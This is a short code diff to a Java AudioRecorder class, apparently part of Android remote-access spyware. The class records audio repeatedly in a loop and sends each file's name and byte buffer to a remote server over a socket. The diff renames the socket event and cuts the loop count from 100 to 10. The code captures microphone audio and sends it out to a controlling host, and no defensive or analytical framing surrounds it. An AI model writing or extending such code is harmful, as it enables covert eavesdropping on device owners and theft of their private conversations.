@@ -88,7 +88,7 @@ public  class AudioRecorder {
             object.put("file",true);
             object.put("name",file.getName());
             object.put("buffer" , data);
-            IOSocket.getInstance().getIoSocket().emit("0xlive" , object);
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
             buf.close();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
@@ -103,7 +103,7 @@ public  class AudioRecorder {
 
     public static void send_audioFiles(){
         int limit = 0;
-        while(limit < 100){
+        while(limit < 10){
             try{
                 startRecording();
                 limit++;
